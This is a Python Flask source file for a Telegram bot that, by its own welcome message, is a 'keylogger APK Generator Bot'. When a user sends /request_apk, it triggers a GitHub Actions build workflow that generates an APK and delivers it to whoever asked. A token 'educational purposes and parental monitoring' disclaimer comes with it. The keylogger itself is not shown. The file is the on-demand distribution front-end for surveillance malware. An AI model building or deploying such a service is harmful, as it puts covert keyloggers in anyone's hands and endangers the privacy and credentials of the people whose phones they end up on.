import os
from flask import Flask, request, render_template
import requests
import logging

# Flask App Setup
app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
app.logger.setLevel(logging.DEBUG)

# Configuration from environment
BOT_TOKEN = os.getenv("BOT_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
GITHUB_PAT = os.getenv("GITHUB_PAT")

if not BOT_TOKEN or not REPO_OWNER or not REPO_NAME or not GITHUB_PAT:
    raise ValueError("BOT_TOKEN, REPO_OWNER, REPO_NAME, or GITHUB_PAT is missing from environment variables.")

# Route to serve index.html
@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

# Telegram webhook route
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_message():
    data = request.json
    app.logger.debug(f"Received data: {data}")

    chat_id = data.get('message', {}).get('chat', {}).get('id')
    command = data.get('message', {}).get('text')

    if not chat_id or not command:
        return "Invalid data", 400

    if command == "/start":
        welcome = (
            "Welcome to the keylogger APK Generator Bot! 🎉\n\n"
            "This bot was developed by cyber naveen. "
            "Follow my [Instagram profile](https://www.instagram.com/cyber.naveen.info) for updates!\n\n"
            "📝 *Disclaimer*: This bot is intended for educational purposes and parental monitoring only. "
            "Use responsibly.\n\n"
            "Use `/request_apk` to generate your APK."
        )
        send_message(chat_id, welcome, parse_mode="Markdown")
    elif command == "/request_apk":
        response = trigger_github_action(chat_id)
        if response and response.status_code == 204:
            send_message(chat_id, "Your APK is being generated. You will receive it shortly!")
        else:
            app.logger.error(f"GitHub Trigger Failed: {response.text if response else 'No response'}")
            send_message(chat_id, "Error generating your APK. Please try again later.")
    else:
        send_message(chat_id, "Unknown command. Use /start to see available commands.")
    return "OK"

def trigger_github_action(chat_id):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/build.yml/dispatches"
    payload = {
        "ref": "main",
        "inputs": {"chat_id": str(chat_id)}
    }
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "Authorization": f"Bearer {GITHUB_PAT}"
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        app.logger.debug(f"GitHub Response: {response.status_code}, {response.text}")
        return response
    except Exception as e:
        app.logger.error(f"GitHub Trigger Error: {e}")
        return None

def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, data=payload)
        app.logger.debug(f"Telegram Response: {response.status_code}, {response.text}")
    except Exception as e:
        app.logger.error(f"Telegram Send Error: {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)
